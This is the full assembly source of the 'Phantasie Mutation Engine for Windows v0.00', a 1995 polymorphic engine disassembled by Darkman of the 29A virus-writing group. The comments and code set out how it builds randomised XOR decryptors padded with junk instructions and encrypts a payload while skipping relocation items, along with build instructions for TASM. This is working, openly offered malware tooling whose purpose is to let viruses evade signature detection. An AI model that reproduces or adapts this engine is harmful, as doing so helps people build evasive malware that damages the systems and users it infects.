comment *
 Phantasie Mutation Engine for Windows v 0.00 [PME/W]  млллллм млллллм млллллм
                    Disassembly by                     ллл ллл ллл ллл ллл ллл
                     Darkman/29A                        мммллп плллллл ллллллл
                                                       лллмммм ммммллл ллл ллл
                                                       ллллллл ллллллп ллл ллл

                 Calling parameters:
                   CX     Length of original code
                   DX:AX  Pointer to relocation table
                   DS:SI  Pointer to original code
                   ES:DI  Pointer to decryptor + encrypted code

                 Return parameters:
                   CX     Length of decryptor

  Garbage instructions:
    CLD; STD; REP; REPNE; NOP; MOV reg,reg; MOV reg,[imm16]; ADD reg,reg;
    ADD reg,[imm16]; ADC reg,reg; ADC reg,[imm16]; SUB reg,reg;
    SUB reg,[imm16]; SBB reg,reg; SBB reg,[imm16]; CMP reg,reg;
    CMP reg,[imm16]; AND reg,reg; AND reg,[imm16]; OR reg,reg; OR reg,[imm16];
    XOR reg,reg; XOR reg,[imm16];
  
  Garbage registers:
    AL; AH; BL; BH; CL; CH; DL; DH; AX; BX; CX; DX; BP; SP; DI; SI

  Decryptor:
    One to thirty-five bytes of garbage instruction(s).
    PUSHA
    One to thirty-five bytes of garbage instruction(s).
    PUSH DS
    One to thirty-five bytes of garbage instruction(s).
    PUSH CS
    One to thirty-five bytes of garbage instruction(s).
    POP BX
    One to thirty-five bytes of garbage instruction(s).
    MOV AX,0Ah
    One to thirty-five bytes of garbage instruction(s).
    INT 31h
    One to thirty-five bytes of garbage instruction(s).
    MOV DS,AX
    One to thirty-five bytes of garbage instruction(s).
    MOV BX,imm16                                    (Offset of encrypted code)
    One to thirty-five bytes of garbage instruction(s).
    One to thirty-five bytes of garbage instruction(s).
    XOR [BX],imm8
    One to thirty-five bytes of garbage instruction(s).
    NOT BX    
    One to thirty-five bytes of garbage instruction(s).
    NEG BX    
    One to thirty-five bytes of garbage instruction(s).
      CMP BX,imm16                                 (Offset of relocation item)
      One to thirty-five bytes of garbage instruction(s).
      JNE imm8                                   (Offset of end of ADD BX,04h)
      One to thirty-five bytes of garbage instruction(s).
      ADD BX,04h
      One to thirty-five bytes of garbage instruction(s).
    CMP BX,imm16                                    (Offset of encrypted code)
    One to thirty-five bytes of garbage instruction(s).
    JE imm8                                         (Offset of encrypted code)
    One to thirty-five bytes of garbage instruction(s).
    JMP imm16               (Offset of garbage generation above XOR [BX],imm8)
    One to thirty-five bytes of garbage instruction(s).
    POP DS
    One to thirty-five bytes of garbage instruction(s).
    POPA

  Minimum length of decryptor:               47 bytes.
  Maximum length of decryptor:              Depends on the number of
                                            relocation items
  Length of PME for Windows v 0.00 [PME/W]: 957 bytes.

  To compile PME for Windows v 0.00 [PME/W] with Turbo Assembler v 5.0 type:
    TASM /M PMEW.ASM
*

.model tiny
.code
.186
             public  pmew,pmew_end

code_begin:
pmew         proc    near                ; PME for Windows v 0.00 [PME/W]
             jmp     pmew_poly

             nop     
             
             db      ' PME for Windows v0.00 (C) Jul 1995 By Burglar '
pmew_poly:
             push    ax bx dx bp si di ds es
             mov     bp,ds               ; BP = data segment

             push    ax                  ; Save AX at stack
             push    cs                  ; Save CS at stack
             pop     bx                  ; Load BX from stack (CS)

             mov     ax,0ah              ; Create alias descriptor
             int     31h
             mov     ds,ax               ; DS = new data selector
             pop     ax                  ; Load AX from stack

             call    delta_offset
delta_offset:
             pop     bx                  ; Load BP from stack
             sub     bx,offset delta_offset

             mov     [bx+reg_flags],1111110110101010b
             mov     [bx+flags_flag],00000000h
             nop     

             mov     word ptr [bx+original_ptr],si
             mov     word ptr [bx+original_ptr+02h],bp
             mov     word ptr [bx+decrypt_ptr],di
             mov     word ptr [bx+decrypt_ptr+02h],es
             mov     [bx+original_len],ax
             mov     word ptr [bx+relocat_ptr],ax
             mov     word ptr [bx+relocat_ptr+02h],dx

             cld                         ; Clear direction flag
             call    gen_garbage

             mov     al,01100000b        ; PUSHA (opcode 60h)
             stosb                       ; Store PUSHA
             mov     [bx+reg_flags],0000000000000000b
             call    gen_garbage

             mov     al,00011110b        ; PUSH DS (opcode 1eh)
             stosb                       ; Store PUSH DS
             call    gen_garbage

             mov     al,00001110b        ; PUSH CS (opcode 0eh)
             stosb                       ; Store PUSH CS
             call    gen_garbage

             mov     al,01011011b        ; POP BX (opcode 5bh)
             stosb                       ; Store POP BX
             or      [bx+reg_flags],0000000010001000b
             call    gen_garbage

             mov     al,10111000b        ; MOV AX,imm16 (opcode 0b8h)
             stosb                       ; Store MOV AX,imm16
             mov     ax,0ah              ; MOV AX,0Ah (opcode 0b8h,0ah,00h)
             stosw                       ; Store MOV AX,imm16
             or      [bx+reg_flags],0000000000010001b
             call    gen_garbage

             mov     ax,0011000111001101b
             stosw                       ; Store INT 31h (opcode 0cdh,31h)
             and     [bx+reg_flags],1111111101110111b
             call    gen_garbage

             mov     ax,1101100010001110b
             stosw                       ; Store MOV DS,AX (opcode 8eh,0d8h)
             and     [bx+reg_flags],0000000000010001b
             call    gen_garbage

             mov     al,10111011b        ; MOV BX,imm16 (opcode 0bbh)
             stosb                       ; Store MOV BX,imm16
             push    di                  ; Save DI at stack
             scasw                       ; Store 16-bit immediate
             or      [bx+reg_flags],0000000010001000b
             call    gen_garbage

             mov     [bx+mov_bx_off],di  ; Store offset of MOV BX,imm16
             call    gen_garbage

             mov     ax,0011011110000000b
             stosw                       ; Store XOR [BX],imm8 (opcode 80h...)
             push    di                  ; Save DI at stack
             scasb                       ; Store 8-bit immediate
             call    gen_garbage

             mov     ax,1101001111110111b
             stosw                       ; Store NOT BX (opcode 0f7h,0d3h)
             call    gen_garbage

             mov     ax,1101101111110111b
             stosw                       ; Store NEG BX (opcode 0f7h,0dbh)
             call    gen_garbage

             push    ds                  ; Save DS at stack
             mov     si,word ptr [bx+relocat_ptr]
             mov     ds,word ptr [bx+relocat_ptr+02h]
             mov     cx,[si]             ; CX = number of relocation items
             pop     ds                  ; Load DS from stack
             jcxz    no_rel_items        ; No relocation items? Jump to no_...
gen_rel_loop:
             mov     ax,1111101110000001b
             stosw                       ; Store CMP BX,imm16 (opcode 81h,...)
             push    di                  ; Save DI at stack
             scasw                       ; Store 16-bit immediate
             mov     [bx+flags_flag],00000001b
             nop     
             call    gen_garbage

             mov     al,01110101b        ; JNE imm8 (opcode 75h)
             stosb                       ; Store JNE imm8
             push    di                  ; Save DI at stack
             scasb                       ; Store 8-bit immediate
             mov     [bx+flags_flag],00000000h
             nop     
             call    gen_garbage

             mov     ax,1100001110000011b
             stosw                       ; Store ADD BX,imm8 (opcode 83h,0c3h)
             mov     al,04h              ; ADD BX,04h (opcode 83h,0c3h,04h)
             stosb                       ; Store ADD BX,04h
             call    gen_garbage

             pop     si                  ; Load SI from stack
             mov     dx,si               ; DX = offset of JNE imm8
             inc     dx                  ; DX = offset of end of JNE imm8

             mov     ax,di               ; AX = offset within decryptor
             sub     ax,dx               ; AX = 16-bit immediate
             mov     es:[si],al          ; Store 8-bit immediate

             loop    gen_rel_loop
no_rel_items:
             mov     ax,1111101110000001b
             stosw                       ; Store CMP BX,imm16 (opcode 81h,...)
             push    di                  ; Save DI at stack
             scasw                       ; Store 16-bit immediate
             mov     [bx+flags_flag],00000001b
             nop     
             call    gen_garbage

             mov     al,01110100b        ; JE imm8 (opcode 74h)
             stosb                       ; Store JE imm8
             push    di                  ; Save DI at stack
             scasb                       ; Store 8-bit immediate
             call    gen_garbage

             mov     al,11101001b        ; JMP imm16 (opcode 0e9h)
             stosb                       ; Store JMP imm16

             mov     ax,[bx+mov_bx_off]  ; AX = offset of MOV BX,imm16
             mov     dx,di               ; DX = offset within decryptor
             add     dx,02h              ; DX = offset of end of decryptor
             sub     ax,dx               ; AX = 16-bit immediate
             stosw                       ; Store 16-bit immediate
             call    gen_garbage

             pop     si                  ; Load SI from stack
             mov     dx,si               ; DX = offset of JNE imm8
             inc     dx                  ; DX = offset of end of JNE imm8

             mov     ax,di               ; AX = offset within decryptor
             sub     ax,dx               ; AX = 16-bit immediate
             mov     es:[si],al          ; Store 8-bit immediate

             mov     al,00011111b        ; POP DS (opcode 1fh)
             stosb                       ; Store POP DS
             call    gen_garbage

             mov     al,01100001b        ; POPA (opcode 61h)
             stosb                       ; Store POPA
             
             mov     ax,di               ; AX = offset of encrypted code
             sub     ax,word ptr [bx+decrypt_ptr]
             mov     [bx+decrypt_len],ax ; Store length of decryptor

             mov     ax,[bx+decrypt_len] ; AX = length of decryptor
             add     ax,[bx+original_len]
             pop     si                  ; Load SI from stack
             mov     es:[si],ax          ; Store 16-bit immediate

             mov     dx,ds               ; DX = new data selector
             mov     si,word ptr [bx+relocat_ptr]
             mov     ds,word ptr [bx+relocat_ptr+02h]
             lodsw                       ; AX = number of relocation items
             mov     cx,ax               ; CX =   "    "      "        "
             jcxz    no_rel_item         ; No relocation items? Jump to no_...

             dec     ax                  ; Decrease number of relocation items
             shl     ax,01h              ; Multiply number of relocation it...
             add     si,ax               ; SI = offset of last relocation item

             std                         ; Set direction flag
sto_rel_loop:
             lodsw                       ; AX = relocation item
             mov     bp,ds               ; BP = data segment
             mov     ds,dx               ; DS = new data selector
             add     ax,[bx+decrypt_len] ; Add length of decryptor to reloc...
             mov     ds,bp               ; DS = data segment

             pop     bp                  ; Load BP from stack
             mov     es:[bp+00h],ax      ; Store offset of relocation item ...

             loop    sto_rel_loop

             cld                         ; Clear direction flag
no_rel_item:
             mov     ds,dx               ; DS = new data selector
             call    get_rnd_num

             pop     bp                  ; Load BP from stack
             mov     es:[bp+0],al        ; Store encryption/decryption key

             pop     bp                  ; Load BP from stack
             push    [bx+decrypt_len]    ; Save length of decryptor at stack
             pop     es:[bp+00h]         ; Load offset of encrypted code fr...

             mov     cx,[bx+original_len]
             mov     si,word ptr [bx+original_ptr]
             mov     ds,word ptr [bx+original_ptr+02h]
             push    di                  ; Save DI at stack
             rep     movsb               ; Move the original code above the...
             pop     di                  ; Load DI from stack

             mov     ds,dx               ; DS = new data selector
             mov     bp,[bx+decrypt_len] ; BP = length of decryptor
             mov     cx,[bx+original_len]
             mov     si,word ptr [bx+relocat_ptr]
             mov     ds,word ptr [bx+relocat_ptr+02h]
encrypt_loop:
             push    ax cx si            ; Save registers at stack
             xor     es:[di],al          ; Encrypt byte of original code

             inc     di                  ; Increase index register

             lodsw                       ; AX = number of relocation items
             mov     cx, ax              ; CX =   "    "      "        "
             jcxz    no_rel_item_        ; No relocation items? Jump to no_...
tst_rel_loop:
             lodsw                       ; AX = relocation item
             add     ax,bp               ; Add data segment to relocation item

             push    ds                  ; Save DS at stack
             mov     ds,dx               ; DS = new data selector
             add     ax,word ptr [bx+decrypt_ptr]
             pop     ds                  ; Load DS from stack

             cmp     di,ax               ; Encrypting a relocation item?
             jne     not_rel_item        ; Not equal? Jump to not_rel_item

             add     di,04h              ; Don't encrypt relocation items
not_rel_item:
             loop    tst_rel_loop
no_rel_item_:
             pop     si cx ax            ; Load registers from stack

             loop    encrypt_loop

             mov     ds,dx               ; DS = new data selector
             mov     cx,[bx+decrypt_len] ; CX = length of decryptor
             pop     es ds di si bp dx bx ax

             ret                         ; Return
             endp

gen_garbage  proc    near                ; Generate garbage
             push    si                  ; Save SI at stack
             call    get_rnd_num
             aam     20h                 ; AL = random number within thirty...
             cbw                         ; Zero AH
             mov     bp,ax               ; AX = random number within thirty...
             add     bp,di               ; BP = offset of end of garbage ge...
garbage_loop:
             call    get_rnd_num
             and     al,00000001b        ; AL = random number within one
             shl     al,01h              ; Multiply random number with two
             mov     si,ax               ; SI = random number within one
             and     si,0000000011111111b

             mov     si,[bx+si+garbage_tbl]
             lea     si,[bx+si]          ; SI = offset of garbage generator
             call    si
             cmp     di,bp               ; End of garbage generation?
             jb      garbage_loop        ; Below? Jump to garbage_loop
             pop     si                  ; Load SI from stack

             ret                         ; Return
             endp

gen_logical  proc    near                ; Generate logical operation
             push    ax cx dx si         ; Save registers at stack
             call    get_rnd_num
             aam     (logica_end-logica_begin)

             test    [bx+flags_flag],00000001b
             nop     
             jz      gen_flag_gar        ; Generate flag modifying garbage?...

             and     al,00000000b        ; Zero AL
gen_flag_gar:
             cbw                         ; Zero AH
             mov     si,ax               ; SI = random number within nine
             mov     ah,[bx+si+logical_tbl]

             call    get_rnd_num
             test    al,00000001b        ; Generate MOV reg,reg; ADD reg,r...?
             jnz     gen_reg_reg         ; Not zero? Jump to gen_reg_reg

             call    get_dest_reg

             push    ax                  ; Save AX at stack
             shr     al,03h              ; Shift AL logical three bits right
             and     al,00000001b        ; MOV reg,reg; ADD reg,reg; ADC re...
             or      ah,al               ;      "            "           "

             call    get_rnd_num
             and     al,00000010b        ; AL = direction
             or      ah,al               ; MOV reg,reg; ADD reg,reg; ADC re...
             xchg    al,ah               ;      "            "           "
             stosb                       ; Store MOV reg,reg; ADD reg,reg; ...
             or      ah,ah
             pop     ax                  ; Load AX from stack
             
             mov     ah,al               ; AH = destination register
             call    get_rnd_num
             jnz     prepare_regs        ; Not zero? Jump to prepare_regs
             and     ah,00000111b        ; AH = destnation register

             and     al,00111000b        ; AL = source register

             jmp     sto_reg_reg

             nop     
prepare_regs:
             shl     al,03h              ; Shift AL logical two bits left
             and     ah,00111000b        ; AL = source register
             and     al,00000111b        ; AH = destnation register
sto_reg_reg:
             or      al,11000000b        ; MOV reg,reg; ADD reg,reg; ADC re...
             or      al,ah               ;      "            "           "
             stosb                       ; Store MOV reg,reg; ADD reg,reg; ...

             jmp     gen_log_exit

             nop     
gen_reg_reg:
             or      ah,00000010b        ; MOV reg,[imm16]; ADD reg,[imm16]...
             call    get_dest_reg

             push    ax                  ; Save AX at stack
             shr     al,03h              ; Shift AL logical three bits right
             and     al,00000001b        ; MOV reg,[imm16]; ADD reg,[imm16]...
             or      ah,al               ;        "                 "
             mov     al,ah               ;        "                 "
             stosb                       ; Store MOV reg,[imm16]; ADD reg,[...
             pop     ax                  ; Load AX from stack

             shl     al,03h              ; Shift AL logical two bits left
             and     al,00111000b        ; AL = destination register
             or      al,00000110b        ; AL =      "         "
             stosb                       ; Store MOV reg,[imm16]; ADD reg,[...

             call    get_rnd_num
             mov     ah,al               ; AH = 8-bit random number

             call    get_rnd_num
             xor     dx,dx               ; Zero DX
             mov     cx,1ffh             ; Didide random number by five hun...
             div     cx                  ; AX = 16-bit immediate
             stosw                       ; Store 16-bit immediate
gen_log_exit:
             pop     si dx cx ax         ; Load registers from stack

             ret                         ; Return
             endp
             
gen_one_byte proc    near                ; Generate one byte garbage instru...
             push    si                  ; Save SI at stack
             call    get_rnd_num
             aam     (one_by_end-one_by_begin)
             cbw                         ; Zero AH

             mov     si,ax               ; SI = random number within five
             mov     al,byte ptr [bx+si+one_byte_tbl]
             stosb                       ; Store one byte garbage instruction
             pop     si                  ; Load SI from stack

             ret                         ; Return
             endp

get_dest_reg proc    near                ; Get destination register
             push    si                  ; Save SI at stack
             call    get_rnd_num
             and     al,00001111b        ; AL = random number within fifteen
             shl     al,01h              ; Multiply random number with two
             mov     si,ax               ; SI = random number within fifteen
             and     si,0000000011111111b
             mov     si,[bx+si+test_reg_tbl]
             lea     si,[bx+si]          ; SI = offset of register test
             call    si
             pop     si                  ; Load SI from stack
             jnz     get_dest_reg        ; Not zero? Jump to get_dest_reg

             shr     al,01h              ; Divide random number by two

             ret                         ; Return
             endp

test_one     proc                        ; First test
             test    [bx+reg_flags],0000000000000001b

             ret                         ; Return
             endp

test_two     proc                        ; Second test
             test    [bx+reg_flags],0000000000000010b

             ret                         ; Return
             endp

test_three   proc                        ; Third test
             test    [bx+reg_flags],0000000000000100b

             ret                         ; Return
             endp

test_four    proc                        ; Fourth test
             test    [bx+reg_flags],0000000000001000b

             ret                         ; Return
             endp

test_five    proc                        ; Fifth test
             test    [bx+reg_flags],0000000000010000b

             ret                         ; Return
             endp

test_six     proc                        ; Sixth test
             test    [bx+reg_flags],0000000000100000b

             ret                         ; Return
             endp

test_seven   proc                        ; Seventh test
             test    [bx+reg_flags],0000000001000000b

             ret                         ; Return
             endp

test_eight   proc                        ; Eightth test
             test    [bx+reg_flags],0000000010000000b

             ret                         ; Return
             endp

test_nine    proc                        ; Nineth test
             test    [bx+reg_flags],0000000000010001b

             ret                         ; Return
             endp

test_ten     proc                        ; Tenth test
             test    [bx+reg_flags],0000000000100010b

             ret                         ; Return
             endp

test_eleven  proc                        ; Eleventh test
             test    [bx+reg_flags],0000000001000100b

             ret                         ; Return
             endp

test_twelve  proc                        ; Twelveth test
             test    [bx+reg_flags],0000000010001000b

             ret                         ; Return
             endp

test_thirtee proc                        ; Thirteenth test
             or      al,al

             ret                         ; Return
             endp

test_fourtee proc                        ; Fourteenth test
             test    [bx+reg_flags],0000001000000000b

             ret                         ; Return
             endp

test_fifteen proc                        ; Fifteenth test
             test    [bx+reg_flags],0000010000000000b

             ret                         ; Return
             endp

test_sixteen proc                        ; Sixteenth test
             test    [bx+reg_flags],0000100000000000b

             ret                         ; Return
             endp

get_rnd_num  proc    near                ; Get 8-bit random number
             pushf                       ; Save flags at stack
             push    cx                  ; Save CX at stack

             push    ax                  ;  "   AX "    "
             in      al,40h              ; AL = 8-bit random number
             mov     cl,al               ; CL =   "     "      "
             in      al,40h              ; AL =   "     "      "
             mov     ah,al               ; AH =   "     "      "
             in      al,40h              ; AL = 8-bit random number
             xor     al,ah               ; Exclusive OR second 8-bit random...
             rcr     al,cl               ; Rotate through carry right first...
             mov     cl,al               ; CL = 8-bit random number
             pop     ax                  ; Load AX from stack

             mov     al,cl               ; AL = 8-bit random number
             pop     cx                  ; Load CX from stack
             popf                        ; Load flags from stack

             ret                         ; Return
             endp
code_end:             
reg_flags    dw      ?                   ; Destination register flags
flags_flag   db      ?                   ; Flags flag
original_ptr dd      ?                   ; Pointer to original code
decrypt_ptr  dd      ?                   ; Pointer to decryptor + encrypted...
relocat_ptr  dd      ?                   ; Pointer to relocation table
original_len dw      ?                   ; Length of original code
decrypt_len  dw      ?                   ; Length of decryptor
mov_bx_off   dw      ?                   ; Offset of MOV BX,imm16
logica_begin:
logical_tbl  db      10001000b           ; MOV reg,reg; MOV reg,[imm16]
             db      00000000b           ; ADD reg,reg; ADD reg,[imm16]
             db      00010000b           ; ADC reg,reg; ADC reg,[imm16]
             db      00101000b           ; SUB reg,reg; SUB reg,[imm16]
             db      00011000b           ; SBB reg,reg; SBB reg,[imm16]
             db      00111000b           ; CMP reg,reg; CMP reg,[imm16]
             db      00100000b           ; AND reg,reg; AND reg,[imm16]
             db      00001000b           ; OR reg,reg; OR reg,[imm16]
             db      00110000b           ; XOR reg,reg; XOR reg,[imm16]
logica_end:
one_by_begin:
one_byte_tbl:
             cld                         ; Clear direction flag
             std                         ; Set direction flag
             rep
             repne
             nop     
one_by_end:
test_begin:
test_reg_tbl dw      test_one            ; Offset of test_one
             dw      test_two            ; Offset of test_two
             dw      test_three          ; Offset of test_three
             dw      test_four           ; Offset of test_four
             dw      test_five           ; Offset of test_five
             dw      test_six            ; Offset of test_six
             dw      test_seven          ; Offset of test_seven
             dw      test_eight          ; Offset of test_eight
             dw      test_nine           ; Offset of test_nine
             dw      test_ten            ; Offset of test_ten
             dw      test_eleven         ; Offset of test_eleven
             dw      test_twelve         ; Offset of test_twelve
             dw      test_thirtee        ; Offset of test_thirtee
             dw      test_fourtee        ; Offset of test_fourtee
             dw      test_fifteen        ; Offset of test_fifteen
             dw      test_sixteen        ; Offset of test_sixteen
test_end:
garbage_tbl  dw      gen_logical         ; Offset of gen_logical
             dw      gen_one_byte        ; Offset of gen_one_byte
data_end:
pmew_end:

end          code_begin

